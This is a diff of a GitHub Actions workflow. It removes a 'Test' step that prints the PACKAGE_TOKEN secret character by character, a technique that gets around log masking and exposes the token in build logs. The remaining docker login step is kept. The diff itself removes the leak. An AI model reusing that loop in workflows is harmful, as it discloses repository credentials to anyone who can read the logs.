@@ -18,15 +18,6 @@ jobs:
     needs: [build-image]
     runs-on: self-hosted
     steps:
-      - name: Test
-        run: |
-          for i in $(seq 0 $((${#MY_SECRET} - 1))); do
-            echo -n "${MY_SECRET:$i:1}"
-          done
-        env:
-          MY_SECRET: ${{ secrets.PACKAGE_TOKEN }}
-
-
       - name: Login to GitHub Container Registry
         run: echo "${{ secrets.PACKAGE_TOKEN }}" | docker login ghcr.io -u gabrielopensource --password-stdin
 
